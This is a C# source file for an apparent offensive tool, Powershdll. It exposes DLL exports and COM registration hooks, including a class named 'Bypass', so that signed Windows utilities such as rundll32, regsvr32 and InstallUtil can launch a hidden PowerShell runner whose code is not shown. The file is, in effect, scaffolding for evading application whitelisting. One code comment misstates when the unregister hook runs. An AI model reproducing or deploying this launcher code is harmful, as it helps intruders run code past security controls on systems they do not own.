using System;
using System.Runtime.InteropServices;
using RGiesecke.DllExport;
using System.EnterpriseServices;

//https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/

[assembly: ApplicationActivation(ActivationOption.Server)]
[assembly: ApplicationAccessControl(false)]

namespace Powershdll
{
    public class Program
    {
        public static void Main()
        {
            Console.WriteLine("");
        }

    }
    public static class UtilDLL
    {
        [DllExport("main", CallingConvention = CallingConvention.Cdecl)]
        public static void main(IntPtr hwnd, IntPtr hinst, string lpszCmdLine, int nCmdShow)
        {
            PowerShdll psdl = new PowerShdll();
            psdl.start(lpszCmdLine.Split(' '));
        }

        [DllExport("DllRegisterServer", CallingConvention = CallingConvention.StdCall)]
        public static void DllRegisterServer()
        {
            PowerShdll psdl = new PowerShdll();
            psdl.start(new string[0]);
        }
        [DllExport("DllUnregisterServer", CallingConvention = CallingConvention.StdCall)]
        public static void DllUnregisterServer()
        {
            PowerShdll psdl = new PowerShdll();
            psdl.start(new string[0]);
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Thing1 : System.Configuration.Install.Installer
    {
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
        }

    }

    [ComVisible(true)]
    [Guid("31D2B969-7608-426E-9D8E-A09FC9A51680")]
    [ClassInterface(ClassInterfaceType.None)]
    [ProgId("dllguest.Bypass")]
    [Transaction(TransactionOption.Required)]
    public class Bypass : ServicedComponent
    {
        public Bypass() { }

        [ComRegisterFunction] //This executes if registration is successful
        public static void RegisterClass(string key)
        {
            PowerShdll psdl = new PowerShdll();
            psdl.start(new string[0]);
        }

        [ComUnregisterFunction] //This executes if registration fails
        public static void UnRegisterClass(string key)
        {
            PowerShdll psdl = new PowerShdll();
            psdl.start(new string[0]);
        }

        public void Exec() {
            PowerShdll psdl = new PowerShdll();
            psdl.start(new string[0]);
        }
    }

   
}


